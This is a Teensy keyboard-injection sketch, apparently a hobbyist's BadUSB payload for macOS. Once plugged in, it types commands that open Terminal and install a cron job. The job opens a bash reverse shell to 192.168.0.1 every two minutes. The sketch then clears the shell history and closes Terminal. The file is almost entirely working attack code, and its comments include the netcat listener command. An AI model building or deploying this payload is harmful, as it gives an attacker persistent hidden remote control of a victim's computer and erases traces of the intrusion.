//Teensy crontab bash remote shell thing <-in my own words. 
//
//There are lots of differing versions of this script. Mine is no better. It may even be alot
//worse - however, I wanted to explore / see how it did what it did. 
//
//This script opens terminal and creates an cron task. The cron task tries to open a reverse shell on 
//your remote machine every 2 minutes.
//To listen on the remote machine use nc -l -p 1337
//


#define LED_PIN 13

void setup() {

//Turn on led while working.
pinMode(LED_PIN, OUTPUT);
digitalWrite(LED_PIN, HIGH);

//Pause for a moment while dongle connects
delay(1000);

//CMD-SPACE to open a search window
opensearch();

//Pause for a moment
delay(500);

//Type into search window
typeln("terminal");

//Pause for a moment
delay(500);

//Create new cron thing using nano as editor
typeln("env EDITOR=nano crontab -e");

//Pause for a moment
delay(200);

//Attempt to connect to remote machine with bash reverse shell
typeln("*/2 * * * * bash -i >& /dev/tcp/192.168.0.1/1234 0>&1");

//Pause for a moment
delay(200);

//Quit Nano
quitnano();

//Pause for a moment
delay(200);

//Remove last typed commands from terminal history
typeln("history -c");

//Pause for a moment
delay(200);

//Exit terminal
exitterminal();

//Turn off LED
digitalWrite(LED_PIN, LOW);
}

//CMD-SPACE to initiate search
void opensearch()
{
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

//Type things
void typeln(String chars)
{
  Keyboard.println(chars);
  Keyboard.send_now();
}


//Quit Nano
void quitnano()
{
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_X);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(50);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(50);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(50);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

//Exit terminal
void exitterminal()
{
  typeln("");
  typeln("exit"); 
  delay(200);
  quitapp();
}

//Quit application
void quitapp()
{
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_Q);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}


void loop() 
{
}
